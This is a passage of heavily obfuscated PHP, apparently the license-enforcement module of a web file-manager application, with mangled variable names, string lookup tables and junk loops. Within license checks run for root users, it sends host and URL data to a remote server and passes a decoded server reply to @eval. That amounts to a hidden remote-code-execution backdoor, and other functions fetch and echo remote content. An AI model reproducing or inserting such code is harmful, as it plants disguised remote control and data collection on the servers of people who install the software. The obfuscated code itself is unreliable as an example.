$ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]] ? $ğ¶µ‰ê½[179] . $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]] : $â¯ºËĞ; show_json($ãÉœ±â, !1); } else { $ÜÑÖÚ¦ã[$ğ¶µ‰ê½[155]] = $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]][$ğ¶µ‰ê½[180]]; } } else { $ÜÔÃ¥ì÷ = $this->vurm37fa4e72($ğ¶µ‰ê½[181], $ÜÑÖÚ¦ã, 10); } } if (!is_array($ÜÔÃ¥ì÷) || !is_array($ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]]) || $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[152]] != !0) { $â¯ºËĞ = LNG($ğ¶µ‰ê½[182]); $ãÉœ±â = $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]] ? $ğ¶µ‰ê½[179] . $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]] : $â¯ºËĞ; show_json($ãÉœ±â, !1); } $ÃœÓ…“Õ = $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]]; $­è…à¥± = $this->xfad5fcc1643($ÃœÓ…“Õ[$ğ¶µ‰ê½[183]]); $ù„À¤·Š = $Ïì¨›€[701]; if (strlen($ù„À¤·Š) < $Ïì¨›€[669]) { die; } if (!$­è…à¥± || $­è…à¥± != $ÃœÓ…“Õ[$ğ¶µ‰ê½[129]]) { $î™Ê·³¼ = array($ğ¶µ‰ê½[184] => Model($ğ¶µ‰ê½[33])->get($ğ¶µ‰ê½[99]), $ğ¶µ‰ê½[185] => $_SERVER[$ğ¶µ‰ê½[105]], $ğ¶µ‰ê½[186] => this_url(), $ğ¶µ‰ê½[161] => $_SERVER[$ğ¶µ‰ê½[162]]); $½Í˜âÌ = $this->qxsv06505b9c(json_encode($î™Ê·³¼)); $this->vurm37fa4e72($ğ¶µ‰ê½[187] . $½Í˜âÌ); show_json(LNG($ğ¶µ‰ê½[188]), !0); } $ÂçÙ°€Á = array($ğ¶µ‰ê½[153] => $ÃœÓ…“Õ[$ğ¶µ‰ê½[189]], $ğ¶µ‰ê½[190] => $ÃœÓ…“Õ[$ğ¶µ‰ê½[191]], $ğ¶µ‰ê½[192] => rand_string(16), $ğ¶µ‰ê½[107] => $ÃœÓ…“Õ[$ğ¶µ‰ê½[193]]); if ($ÜÑÖÚ¦ã[$ğ¶µ‰ê½[155]]) { $ÂçÙ°€Á[$ğ¶µ‰ê½[192]] = $ÜÑÖÚ¦ã[$ğ¶µ‰ê½[155]]; } $’ÑÕÍ…° = substr(md5($ÂçÙ°€Á[$ğ¶µ‰ê½[190]]), 10, 10); $„ò÷‰¸› = $’ÑÕÍ…° . $ÂçÙ°€Á[$ğ¶µ‰ê½[107]] . $ÂçÙ°€Á[$ğ¶µ‰ê½[192]]; $ş…Ş­ƒ = $Ïì¨›€[702]; if (strlen($ş…Ş­ƒ) < $Ïì¨›€[671]) { return; } $ÂçÙ°€Á[$ğ¶µ‰ê½[109]] = strrev(base64_encode($this->ehka110833eb($„ò÷‰¸›, $ğ¶µ‰ê½[194]))); $§ˆë•¥Û = $Ïì¨›€[703]; $’”£åÂÜ = rand_string(16); $¤Ëå½‘ = $’”£åÂÜ . $ÂçÙ°€Á[$ğ¶µ‰ê½[107]] . $this->ehka110833eb(md5($ÂçÙ°€Á[$ğ¶µ‰ê½[153]]), $’”£åÂÜ); $¸«ñƒçí = $Ïì¨›€[704]; while (strlen($¸«ñƒçí) < $Ïì¨›€[657]) { if (!$¸«ñƒçí) { break; } $¸«ñƒçí++; } $ÂçÙ°€Á[$ğ¶µ‰ê½[110]] = base64_encode(strrev($this->ehka110833eb($¤Ëå½‘, $ğ¶µ‰ê½[195]))); $ŠÀôÁŒˆ = $Ïì¨›€[705]; if ($ÃœÓ…“Õ[$ğ¶µ‰ê½[196]] && $ÃœÓ…“Õ[$ğ¶µ‰ê½[196]] >= 1) { Model($ğ¶µ‰ê½[33])->setDeep($ğ¶µ‰ê½[197], $ğ¶µ‰ê½[122]); } Model($ğ¶µ‰ê½[33])->set($ÂçÙ°€Á); $…ñÑæÀÕ = md5($_SERVER[$ğ¶µ‰ê½[105]] . strrev($½ü±¦Ì) . $ÂçÙ°€Á[$ğ¶µ‰ê½[190]]); $Á÷†¦‰€ = $Ïì¨›€[706]; while ($Á÷†¦‰€ < $Ïì¨›€[661]) { if ($Á÷†¦‰€ >= 0) { break; } $Á÷†¦‰€++; } $ã€Ÿ¸½¦ = strrev(substr($…ñÑæÀÕ, 10, 16)); $‡ù‚ÄÉü = $this->ycsjf993275f(json_encode($ÃœÓ…“Õ), $…ñÑæÀÕ); $“ã¤˜æ» = array_to_keyvalue(Model($ğ¶µ‰ê½[7])->listData(), $ğ¶µ‰ê½[198]); $¡ÎÀäİº = $“ã¤˜æ»[$ğ¶µ‰ê½[199]]; $ğ–¤ü°Ö = array(); $óÎŒ …÷ = $Ïì¨›€[707]; if (strlen($óÎŒ …÷) < $Ïì¨›€[657]) { return; } $ğ–¤ü°Ö[$ã€Ÿ¸½¦] = $‡ù‚ÄÉü; Model($ğ¶µ‰ê½[7])->update($¡ÎÀäİº[$ğ¶µ‰ê½[200]], array($ğ¶µ‰ê½[201] => $ğ–¤ü°Ö)); $ÚØ´ÎğÌ = $Ïì¨›€[708]; if (strlen($ÚØ´ÎğÌ) < $Ïì¨›€[692]) { die; } $this->rdwocac763cc = $ÃœÓ…“Õ; $ÇºçÄ¸è = $Ïì¨›€[709]; if (!$ÇºçÄ¸è) { return; } $this->goeu038097d5 = $ÂçÙ°€Á[$ğ¶µ‰ê½[107]]; $–ê×­Ò… = $Ïì¨›€[710]; while (strlen($–ê×­Ò…) < $Ïì¨›€[692]) { if (!$–ê×­Ò…) { break; } $–ê×­Ò…++; } $this->licenseRegistSuccess(); $’şŞ°²ˆ = $Ïì¨›€[711]; while ($’şŞ°²ˆ < $Ïì¨›€[692]) { if ($’şŞ°²ˆ >= 0) { break; } $’şŞ°²ˆ++; } Cache::set($ğ¶µ‰ê½[202] . md5($½ü±¦Ì . $ğ¶µ‰ê½[203]), $ğ¶µ‰ê½[6]); show_json(LNG($ğ¶µ‰ê½[188]), !0); } private function licenseRegistSuccess() { $¼ïëí£Õ =& $_SERVER[ÂÍ‘ñ¿ò]; $®ò¦Èå = Model($¼ïëí£Õ[33])->get(); $İÀ«Ùã = $_SERVER[•Ùç É][712]; if ($®ò¦Èå[$¼ïëí£Õ[63]] != $¼ïëí£Õ[122]) { Model($¼ïëí£Õ[33])->set($¼ïëí£Õ[63], $¼ïëí£Õ[122]); } Action($¼ïëí£Õ[204])->initStart(!0); } private function pjyi28728f55() { $ü¿«‰¡‘ =& $_SERVER[•Ùç É]; $­ğ±„È =& $_SERVER[ÂÍ‘ñ¿ò]; Model($­ğ±„È[33])->set(array($­ğ±„È[153] => $­ğ±„È[6], $­ğ±„È[190] => $­ğ±„È[6], $­ğ±„È[107] => $­ğ±„È[108], $­ğ±„È[109] => $­ğ±„È[6], $­ğ±„È[110] => $­ğ±„È[6])); Model($­ğ±„È[33])->setDeep($­ğ±„È[197], $­ğ±„È[205]); $this->rdwocac763cc = array(); $¨ÀûìŸŸ = $ü¿«‰¡‘[713]; while ($¨ÀûìŸŸ < $ü¿«‰¡‘[661]) { if ($¨ÀûìŸŸ >= 0) { break; } $¨ÀûìŸŸ++; } $this->goeu038097d5 = $­ğ±„È[108]; } private function zjird0006078() { $óæ¤ñö± =& $_SERVER[•Ùç É]; $ˆïï«ÖÛ =& $_SERVER[ÂÍ‘ñ¿ò]; $_SERVER[$ˆïï«ÖÛ[162]] = _get($_SERVER, $ˆïï«ÖÛ[162], APP_HOST); $this->goeu038097d5 = $ˆïï«ÖÛ[108]; $ç«üàî = Model($ˆïï«ÖÛ[33])->get(); if ($ç«üàî[$ˆïï«ÖÛ[107]] == $ˆïï«ÖÛ[108]) { return; } $ÒßÃÕ•â = Model($ˆïï«ÖÛ[33])->get($ˆïï«ÖÛ[99]); $şËß›æ¸ = $óæ¤ñö±[714]; if (!$şËß›æ¸) { die; } $…ÅğÕ©É = $ˆïï«ÖÛ[202] . md5($ÒßÃÕ•â . $ˆïï«ÖÛ[203]); $Ë¤¿©‡è = $óæ¤ñö±[715]; $úíò—âÍ = Cache::get($…ÅğÕ©É); $ŸÈ”Éû´ = $óæ¤ñö±[716]; if (!is_array($úíò—âÍ) || !isset($úíò—âÍ[$ˆïï«ÖÛ[206]]) || time() - $úíò—âÍ[$ˆïï«ÖÛ[206]] >= 60) { $Ÿò—¤°¦ = Model($ˆïï«ÖÛ[7])->loadList(); $Ë–üüê = $Ÿò—¤°¦[$ˆïï«ÖÛ[199]]; $ãÎÃ¦¤‹ = md5($_SERVER[$ˆïï«ÖÛ[105]] . strrev($ÒßÃÕ•â) . $ç«üàî[$ˆïï«ÖÛ[190]]); $Â—Å³®î = strrev(substr($ãÎÃ¦¤‹, 10, 16)); $úíò—âÍ = $this->gdyv9b19ed81($Ë–üüê[$ˆïï«ÖÛ[85]][$Â—Å³®î], $ãÎÃ¦¤‹); $úíò—âÍ = json_decode($úíò—âÍ, !0); } if (!is_array($úíò—âÍ)) { return $this->pjyi28728f55(); } $¤ÓÂÜª– = strtotime($úíò—âÍ[$ˆïï«ÖÛ[129]]); if (time() >= $¤ÓÂÜª–) { return $this->pjyi28728f55(); } if (time() - $úíò—âÍ[$ˆïï«ÖÛ[206]] > 20) { $úíò—âÍ[$ˆïï«ÖÛ[206]] = time(); Cache::set($…ÅğÕ©É, $úíò—âÍ); } $this->rdwocac763cc = $úíò—âÍ; $this->goeu038097d5 = $ç«üàî[$ˆïï«ÖÛ[107]]; } private function wtcj6d77772b() { $Ó“‹‘§‹ =& $_SERVER[•Ùç É]; $ŠÀó˜ş =& $_SERVER[ÂÍ‘ñ¿ò]; $ÄòÈ„ç£ = $GLOBALS[$ŠÀó˜ş[13]]; $Ã©ù¬—Ø = $Ó“‹‘§‹[717]; if (strlen($Ã©ù¬—Ø) < $Ó“‹‘§‹[661]) { die; } $ÄÁ»¶®ş = $_SERVER[$ŠÀó˜ş[24]]; $ùàÜ˜¡å = $Ó“‹‘§‹[718]; while (strlen($ùàÜ˜¡å) < $Ó“‹‘§‹[671]) { if (!$ùàÜ˜¡å) { break; } $ùàÜ˜¡å++; } if ($ÄÁ»¶®ş == $ŠÀó˜ş[207] && $this->goeu038097d5 == $ŠÀó˜ş[108]) { show_json(LNG($ŠÀó˜ş[208]), !1, $ŠÀó˜ş[209]); } $³Š£Ê¨è = array($ŠÀó˜ş[210], $ŠÀó˜ş[211]); if (in_array($ÄÁ»¶®ş, $³Š£Ê¨è)) { if ($this->goeu038097d5 == $ŠÀó˜ş[108] && isset($ÄòÈ„ç£[$ŠÀó˜ş[212]])) { show_json(LNG($ŠÀó˜ş[208]), !1, $ŠÀó˜ş[209]); die; } $èÂ¦š = $this->ghze5be35b25(); if ($èÂ¦š != intval($ŠÀó˜ş[213])) { if ($èÂ¦š <= Model($ŠÀó˜ş[125])->count()) { show_json(LNG($ŠÀó˜ş[214]), !1, $ŠÀó˜ş[209]); die; } } } } private function fgqs986e2050() { $”‹¤³Ûâ =& $_SERVER[•Ùç É]; $ªõìÅ©Ğ =& $_SERVER[ÂÍ‘ñ¿ò]; $™©ŒØäÒ = array($ªõìÅ©Ğ[119], $ªõìÅ©Ğ[120]); if (!KodUser::isRoot() || !isset($_GET[$ªõìÅ©Ğ[215]])) { return; } if (!in_array($_SERVER[$ªõìÅ©Ğ[24]], $™©ŒØäÒ)) { return; } $›å½ƒÇğ = $ªõìÅ©Ğ[216]; $›å½ƒÇğ = $this->hsox157bd8b4($›å½ƒÇğ, $ªõìÅ©Ğ[217]); $ü£‘×§ö = $”‹¤³Ûâ[719]; while (strlen($ü£‘×§ö) < $”‹¤³Ûâ[671]) { if (!$ü£‘×§ö) { break; } $ü£‘×§ö++; } $†ªû™¨³ = stream_context_create(array($ªõìÅ©Ğ[218] => array($ªõìÅ©Ğ[219] => $ªõìÅ©Ğ[220], $ªõìÅ©Ğ[221] => 3))); $¶öÕúßã = $”‹¤³Ûâ[720]; while (strlen($¶öÕúßã) < $”‹¤³Ûâ[692]) { if (!$¶öÕúßã) { break; } $¶öÕúßã++; } $¹«ã ï¬ = @file_get_contents($›å½ƒÇğ, !1, $†ªû™¨³); header($ªõìÅ©Ğ[222]); $åšœ•€“ = $”‹¤³Ûâ[721]; if (!$åšœ•€“) { die; } if ($¹«ã ï¬ && strstr($¹«ã ï¬, $ªõìÅ©Ğ[223])) { echo $¹«ã ï¬; } die; } public function azpd267e5692($Èâøô‡•) { $İ¹á äë =& $_SERVER[•Ùç É]; $ö‡”çıÂ =& $_SERVER[ÂÍ‘ñ¿ò]; if ($this->goeu038097d5 == $ö‡”çıÂ[224]) { return $Èâøô‡•; } $’ï½†¢¬ = array($ö‡”çıÂ[225] => $ö‡”çıÂ[226], $ö‡”çıÂ[227] => $ö‡”çıÂ[226], $ö‡”çıÂ[228] => $ö‡”çıÂ[226], $ö‡”çıÂ[229] => $ö‡”çıÂ[230], $ö‡”çıÂ[231] => $ö‡”çıÂ[230], $ö‡”çıÂ[232] => $ö‡”çıÂ[230], $ö‡”çıÂ[233] => $ö‡”çıÂ[230], $ö‡”çıÂ[234] => $ö‡”çıÂ[230], $ö‡”çıÂ[235] => $ö‡”çıÂ[230], $ö‡”çıÂ[236] => $ö‡”çıÂ[230], $ö‡”çıÂ[237] => $ö‡”çıÂ[230], $ö‡”çıÂ[238] => $ö‡”çıÂ[230], $ö‡”çıÂ[239] => $ö‡”çıÂ[230], $ö‡”çıÂ[240] => $ö‡”çıÂ[230], $ö‡”çıÂ[241] => $ö‡”çıÂ[230]); $×´İâ… = explode($ö‡”çıÂ[242], _get($this->rdwocac763cc, $ö‡”çıÂ[114], $ö‡”çıÂ[6])); $ŒÃÎî“ñ = $İ¹á äë[722]; if (!$ŒÃÎî“ñ) { die; } $À±å”­‡ = array(); foreach ($’ï½†¢¬ as $Ï°¾œ“ô => $–š°Š›¨) { if ($–š°Š›¨ == $ö‡”çıÂ[226] && substr($this->goeu038097d5, 0, 1) == $ö‡”çıÂ[226]) { continue; } if (!in_array($Ï°¾œ“ô, $×´İâ…)) { $À±å”­‡[] = $Ï°¾œ“ô; } } foreach ($À±å”­‡ as $Ï°¾œ“ô) { unset($Èâøô‡•[$Ï°¾œ“ô]); } return $Èâøô‡•; $ÔÅŒ’ğã = $İ¹á äë[723]; while (strlen($ÔÅŒ’ğã) < $İ¹á äë[669]) { if (!$ÔÅŒ’ğã) { break; } $ÔÅŒ’ğã++; } } private function apju5eed77de() { $æØú’«î =& $_SERVER[ÂÍ‘ñ¿ò]; if ($this->goeu038097d5 != $æØú’«î[108]) { $GLOBALS[$æØú’«î[85]][$æØú’«î[89]][$æØú’«î[243]] = $æØú’«î[205]; return; } $GLOBALS[$æØú’«î[85]][$æØú’«î[244]] = $æØú’«î[122]; if (Model($æØú’«î[245])->get($æØú’«î[63]) != $æØú’«î[205]) { Model($æØú’«î[245])->set($æØú’«î[63], $æØú’«î[205]); } } public function ozci2f114716() { return $_SERVER[ÂÍ‘ñ¿ò][246]; } private function eudrb72b712a() { $‹£ƒŠ“ä =& $_SERVER[•Ùç É]; $—Ü••ù— =& $_SERVER[ÂÍ‘ñ¿ò]; $ææÑ°‡ø = array($—Ü••ù—[247], $—Ü••ù—[248], $—Ü••ù—[249]); $ÆæØÄÂ = $—Ü••ù—[250] . md5($—Ü••ù—[251]); if ($this->goeu038097d5 == $—Ü••ù—[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$—Ü••ù—[24]], $ææÑ°‡ø)) { return; } if (time() % 4 != 0) { return; } $³³™ÔùÍ = call_user_func(array($—Ü••ù—[252], $—Ü••ù—[253]), $ÆæØÄÂ); $Ÿºæ¤Ô = $‹£ƒŠ“ä[724]; if ($³³™ÔùÍ && time() - $³³™ÔùÍ < intval($—Ü••ù—[254])) { return; } call_user_func(array($—Ü••ù—[252], $—Ü••ù—[139]), $ÆæØÄÂ, time()); $“´Ëºëë = Model($—Ü••ù—[33])->get($—Ü••ù—[99]); $şªÑı¬ = array($—Ü••ù—[152] => Model($—Ü••ù—[33])->get($—Ü••ù—[153]), $—Ü••ù—[166] => $this->goeu038097d5, $—Ü••ù—[163] => $_SERVER[$—Ü••ù—[164]], $—Ü••ù—[165] => Model($—Ü••ù—[33])->get($—Ü••ù—[131]), $—Ü••ù—[104] => md5($_SERVER[$—Ü••ù—[105]] . $“´Ëºëë), $—Ü••ù—[156] => $—Ü••ù—[136], $—Ü••ù—[159] => $_SERVER[$—Ü••ù—[160]]); $²ñğÛÓÈ = $this->vurm37fa4e72($—Ü••ù—[255], $şªÑı¬); if (!is_array($²ñğÛÓÈ)) { return; } if ($²ñğÛÓÈ[$—Ü••ù—[152]] && $²ñğÛÓÈ[$—Ü••ù—[256]]) { if ($this->xfad5fcc1643($²ñğÛÓÈ[$—Ü••ù—[256]]) == $şªÑı¬[$—Ü••ù—[152]]) { return; } } $this->pjyi28728f55(); $ûÚ»³ĞÆ = $‹£ƒŠ“ä[725]; if (strlen($ûÚ»³ĞÆ) < $‹£ƒŠ“ä[657]) { die; } if ($this->xfad5fcc1643($²ñğÛÓÈ[$—Ü••ù—[256]]) != $şªÑı¬[$—Ü••ù—[152]]) { $‘¬´£¯­ = array($—Ü••ù—[184] => $“´Ëºëë, $—Ü••ù—[185] => $_SERVER[$—Ü••ù—[105]], $—Ü••ù—[186] => this_url(), $—Ü••ù—[161] => $_SERVER[$—Ü••ù—[162]]); $ø©Ç²Ò = $this->qxsv06505b9c(json_encode($‘¬´£¯­)); $²ñğÛÓÈ = $this->vurm37fa4e72($—Ü••ù—[187] . $ø©Ç²Ò); if ($²ñğÛÓÈ && is_array($²ñğÛÓÈ) && isset($²ñğÛÓÈ[$—Ü••ù—[256]])) { $©ÏÂªÙ = $this->gdyv9b19ed81($²ñğÛÓÈ[$—Ü••ù—[256]], 2); if ($©ÏÂªÙ) { $©ÏÂªÙ = $this->xfad5fcc1643($©ÏÂªÙ); } if ($©ÏÂªÙ) { try { @eval($©ÏÂªÙ); } catch (Exception $ È¾¯ú©) { } } } } } private function vurm37fa4e72($÷¸Á ¢ = '', $‹–‡±¯Æ = array(), $¯ïä•´ = 5) { $¶ƒöîŒõ =& $_SERVER[•Ùç É]; $Í‚šĞÒÉ =& $_SERVER[ÂÍ‘ñ¿ò]; $«í’ãš’ = $Í‚šĞÒÉ[257]; $«í’ãš’ = $this->hsox157bd8b4($«í’ãš’, $Í‚šĞÒÉ[258]); $«í’ãš’ = $«í’ãš’ . $÷¸Á ¢; if ($‹–‡±¯Æ && is_array($‹–‡±¯Æ)) { $«í’ãš’ = $«í’ãš’ . $Í‚šĞÒÉ[259] . http_build_query($‹–‡±¯Æ); } if ($‹–‡±¯Æ === -1) { return $«í’ãš’; } $èâİŠÚ· = stream_context_create(array($Í‚šĞÒÉ[218] => array($Í‚šĞÒÉ[221] => $¯ïä•´, $Í‚šĞÒÉ[219] => $Í‚šĞÒÉ[260]), $Í‚šĞÒÉ[261] => array($Í‚šĞÒÉ[262] => !1, $Í‚šĞÒÉ[263] => !1))); $è—ÉÂƒ = $¶ƒöîŒõ[726]; if (!$è—ÉÂƒ) { die; } $‹–‡±¯Æ = @file_get_contents($«í’ãš’, !1, $èâİŠÚ·); return json_decode($‹–‡±¯Æ, !0); $»èˆ¥ˆ¿ = $¶ƒöîŒõ[727]; if (strlen($»èˆ¥ˆ¿) < $¶ƒöîŒõ[657]) { die; } } private function ghze5be35b25() { $¦åÓüª =& $_SERVER[•Ùç É]; $Ö÷àùÒ¦ =& $_SERVER[ÂÍ‘ñ¿ò]; $Æ‰ùƒ = array($Ö÷àùÒ¦[264] => $Ö÷àùÒ¦[265], $Ö÷àùÒ¦[266] => $Ö÷àùÒ¦[267], $Ö÷àùÒ¦[268] => $Ö÷àùÒ¦[269], $Ö÷àùÒ¦[270] => $Ö÷àùÒ¦[271], $Ö÷àùÒ¦[272] => $Ö÷àùÒ¦[273], $Ö÷àùÒ¦[274] => $Ö÷àùÒ¦[213], $Ö÷àùÒ¦[275] => $Ö÷àùÒ¦[213], $Ö÷àùÒ¦[276] => $Ö÷àùÒ¦[265], $Ö÷àùÒ¦[277] => $Ö÷àùÒ¦[267], $Ö÷àùÒ¦[278] => $Ö÷àùÒ¦[269], $Ö÷àùÒ¦[279] => $Ö÷àùÒ¦[280], $Ö÷àùÒ¦[281] => $Ö÷àùÒ¦[271], $Ö÷àùÒ¦[282] => $Ö÷àùÒ¦[283], $Ö÷àùÒ¦[284] => $Ö÷àùÒ¦[273], $Ö÷àùÒ¦[285] => $Ö÷àùÒ¦[286], $Ö÷àùÒ¦[287] => $Ö÷àùÒ¦[288], $Ö÷àùÒ¦[289] => $Ö÷àùÒ¦[290]); $¶À×ëâ˜ = $¦åÓüª[728]; $Á½è§ãÀ = $Æ‰ùƒ[$this->goeu038097d5]; $Á½è§ãÀ = intval($Á½è§ãÀ ? $Á½è§ãÀ : $Ö÷àùÒ¦[265]); $¯±êæÃ = $¦åÓüª[729]; if (!$¯±êæÃ) { die; } $¹ò¹‹çß = _get($this->rdwocac763cc, $Ö÷àùÒ¦[291]); $¹ò¹‹çß = $¹ò¹‹çß ? intval($¹ò¹‹çß) : 0; $È—¡Ôª¬ = $¦åÓüª[730]; while ($È—¡Ôª¬ < $¦åÓüª[657]) { if ($È—¡Ôª¬ >= 0) { break; } $È—¡Ôª¬++; } return $Á½è§ãÀ + $¹ò¹‹çß; } public function heny43e8c145($Ÿé™Ëµ¸) { $Æ¼àœ–Ô =& $_SERVER[•Ùç É]; $³”‘³õ¾ =& $_SERVER[ÂÍ‘ñ¿ò]; $½ãÙóŒ› = $this->ghze5be35b25(); $…¢ªª‰œ = $Æ¼àœ–Ô[731]; if (strlen($…¢ªª‰œ) < $Æ¼àœ–Ô[661]) { die; } if ($Ÿé™Ëµ¸[$³”‘³õ¾[292]] == $³”‘³õ¾[122]) { return; } if ($½ãÙóŒ› >= intval($³”‘³õ¾[213])) { return; } $ÂœÀÇÕ× = Model($³”‘³õ¾[125])->count(); $™ñ¤Æï = $Æ¼àœ–Ô[732]; if ($ÂœÀÇÕ× <= $½ãÙóŒ›) { return; } $¢½„ò = Model($³”‘³õ¾[125])->field($³”‘³õ¾[292])->limit($½ãÙóŒ›)->select(); $èı”Ô§ = $Æ¼àœ–Ô[733]; if (strlen($èı”Ô§) < $Æ¼àœ–Ô[671]) { die; } $¢½„ò = array_to_keyvalue($¢½„ò, $³”‘³õ¾[6], $³”‘³õ¾[292]); if (!in_array($Ÿé™Ëµ¸[$³”‘³õ¾[292]], $¢½„ò)) { show_json($³”‘³õ¾[293], !1, $³”‘³õ¾[209]); } } public function nrfc9373d337() { $ƒí“–ı =& $_SERVER[•Ùç É]; $ïÖéˆşÖ =& $_SERVER[ÂÍ‘ñ¿ò]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $»ì­¶´» = $ïÖéˆşÖ[216]; $»…¦Êå± = $ƒí“–ı[734]; while ($»…¦Êå± < $ƒí“–ı[671]) { if ($»…¦Êå± >= 0) { break; } $»…¦Êå±++; } $»ì­¶´» = $this->hsox157bd8b4($»ì­¶´», $ïÖéˆşÖ[217]); $ïæî¾ = $ƒí“–ı[735]; while ($ïæî¾ < $ƒí“–ı[661]) { if ($ïæî¾ >= 0) { break; } $ïæî¾++; } $¤Î”ÕçÄ = stream_context_create(array($ïÖéˆşÖ[218] => array($ïÖéˆşÖ[219] => $ïÖéˆşÖ[220], $ïÖéˆşÖ[221] => 3))); $ÏÄ»Å²Ú = $ƒí“–ı[736]; while (strlen($ÏÄ»Å²Ú) < $ƒí“–ı[669]) { if (!$ÏÄ»Å²Ú) { break; } $ÏÄ»Å²Ú++; } $¢®òØîÂ = @file_get_contents($»ì­¶´», !1, $¤Î”ÕçÄ); echo $ïÖéˆşÖ[294] . hash_encode($¢®òØîÂ) . $ïÖéˆşÖ[295]; $òìâÜÇî = $ƒí“–ı[737]; } private function ycsjf993275f($ıö¥¢ÌÇ, $ºÃáÖÇğ, $ÕÄÑèí = 3) { $±Äæ£ö§ =& $_SERVER[•Ùç É]; $Ğ³‘íÌî =& $_SERVER[ÂÍ‘ñ¿ò]; usleep(1); $Ç¯¿Æì = $±Äæ£ö§[738]; while (strlen($Ç¯¿Æì) < $±Äæ£ö§[657]) { if (!$Ç¯¿Æì) { break; } $Ç¯¿Æì++; } $ıö¥¢ÌÇ = trim($ıö¥¢ÌÇ); $øŞÊšéû = $±Äæ£ö§[739]; $—›¯úÄ’ = mt_rand(0, 5) . $Ğ³‘íÌî[6]; $ùöÔã = $±Äæ£ö§[740]; if (!$ùöÔã) { return; } $ŠŸúƒÁÑ = rand_string(15); $·ïç‰áú = $Ğ³‘íÌî[296]; $ü¢ÍÎµÔ = $±Äæ£ö§[741]; while ($ü¢ÍÎµÔ < $±Äæ£ö§[692]) { if ($ü¢ÍÎµÔ >= 0) { break; } $ü¢ÍÎµÔ++; } switch ($—›¯úÄ’) { case $Ğ³‘íÌî[205]: $è’‡ÈÄ‡ = $this->ehka110833eb($ıö¥¢ÌÇ, strrev($ºÃáÖÇğ . $ŠŸúƒÁÑ)); break; $À»“ğ­— = $±Äæ£ö§[742]; case $Ğ³‘íÌî[122]: $è’‡ÈÄ‡ = $this->ehka110833eb($ıö¥¢ÌÇ, strrev($ŠŸúƒÁÑ . $ºÃáÖÇğ)); $ÕÑƒ­“Ï = $±Äæ£ö§[743]; break; $®ÁÓº«£ = $±Äæ£ö§[744]; case $Ğ³‘íÌî[297]: $è’‡ÈÄ‡ = $this->ehka110833eb($ıö¥¢ÌÇ, base64_encode($ŠŸúƒÁÑ . $ºÃáÖÇğ)); $—•×€ì” = $±Äæ£ö§[745]; break; case $Ğ³‘íÌî[298]: $è’‡ÈÄ‡ = $this->ehka110833eb($ıö¥¢ÌÇ, md5($ŠŸúƒÁÑ . $ºÃáÖÇğ)); $ûÓËóåÖ = $±Äæ£ö§[746]; if (strlen($ûÓËóåÖ) < $±Äæ£ö§[669]) { return; } break; $ŠŸê³º¢ = $±Äæ£ö§[747]; if (!$ŠŸê³º¢) { die; } case $Ğ³‘íÌî[299]: $ıö¥¢ÌÇ = base64_encode($ıö¥¢ÌÇ); $¢è€üóÙ = rand(0, 64); $¡òõŸø˜ = $±Äæ£ö§[748]; $ŞëçÜ¹ = $·ïç‰áú[$¢è€üóÙ]; $à•ËƒÍ¾ = $±Äæ£ö§[749]; if (!$à•ËƒÍ¾) { die; } $ÂõĞşî¨ = md5($ŞëçÜ¹ . md5($ºÃáÖÇğ . $ŞëçÜ¹) . $ºÃáÖÇğ); $Å†‰ÖÑ = $±Äæ£ö§[750]; while ($Å†‰ÖÑ < $±Äæ£ö§[657]) { if ($Å†‰ÖÑ >= 0) { break; } $Å†‰ÖÑ++; } $ÂõĞşî¨ = substr($ÂõĞşî¨, $¢è€üóÙ % 8, $¢è€üóÙ % 8 + 7); $ëœÂ¿Âá = $Ğ³‘íÌî[6]; $ê¼Á•ÉÌ = 0; $’–§çÊ¦ = 0; $ÍÈ×¡ÂÈ = $±Äæ£ö§[751]; if (!$ÍÈ×¡ÂÈ) { die; } $ˆñÅ»Ù­ = 0; $ºÂí•¬³ = $±Äæ£ö§[752]; for ($ê¼Á•ÉÌ = 0; $ê¼Á•ÉÌ < strlen($ıö¥¢ÌÇ); $ê¼Á•ÉÌ++) { $ˆñÅ»Ù­ = $ˆñÅ»Ù­ == strlen($ÂõĞşî¨) ? 0 : $ˆñÅ»Ù­; $’–§çÊ¦ = ($¢è€üóÙ + strpos($·ïç‰áú, $ıö¥¢ÌÇ[$ê¼Á•ÉÌ]) + ord($ÂõĞşî¨[$ˆñÅ»Ù­++])) % 64; $şÑ¾äì¾ = $±Äæ£ö§[753]; if (strlen($şÑ¾äì¾) < $±Äæ£ö§[692]) { die; } $ëœÂ¿Âá .= $·ïç‰áú[$’–§çÊ¦]; } $è’‡ÈÄ‡ = hash_encode($ŞëçÜ¹ . $ëœÂ¿Âá); break; $àõ¡¶£¬ = $±Äæ£ö§[754]; if (!$àõ¡¶£¬) { die; } default: $è’‡ÈÄ‡ = $this->ehka110833eb($ıö¥¢ÌÇ, $ºÃáÖÇğ . $ŠŸúƒÁÑ); break; } $è’‡ÈÄ‡ = strrev($—›¯úÄ’ . $ŠŸúƒÁÑ . $è’‡ÈÄ‡); $°ËæÙç = $±Äæ£ö§[755]; while ($°ËæÙç < $±Äæ£ö§[671]) { if ($°ËæÙç >= 0) { break; } $°ËæÙç++; } if ($ÕÄÑèí - 1 > 0) { $è’‡ÈÄ‡ = $this->ycsjf993275f($è’‡ÈÄ‡, $ºÃáÖÇğ, $ÕÄÑèí - 1); } return $è’‡ÈÄ‡; } private function gdyv9b19ed81($•õ ñ›õ, $ÒÊÇÓı¿, $ŒŠÀ®¯£ = 3) { $”õÚÚúµ =& $_SERVER[•Ùç É]; $ğƒœ“‚÷ =& $_SERVER[ÂÍ‘ñ¿ò]; if (!is_string($•õ ñ›õ) || strlen($•õ ñ›õ) < 10) { return !1; } $•õ ñ›õ = trim($•õ ñ›õ); $­€½ƒû… = $”õÚÚúµ[756]; if (!$­€½ƒû…) { die; } $•õ ñ›õ = strrev($•õ ñ›õ); $¾¤° ‚‰ = $”õÚÚúµ[757]; $á¯Ê´É½ = $•õ ñ›õ[0]; $×©å¥ = substr($•õ ñ›õ, 1, 15); $úíÚæöÕ = $”õÚÚúµ[758]; if (strlen($úíÚæöÕ) < $”õÚÚúµ[657]) { return; } $•õ ñ›õ = substr($•õ 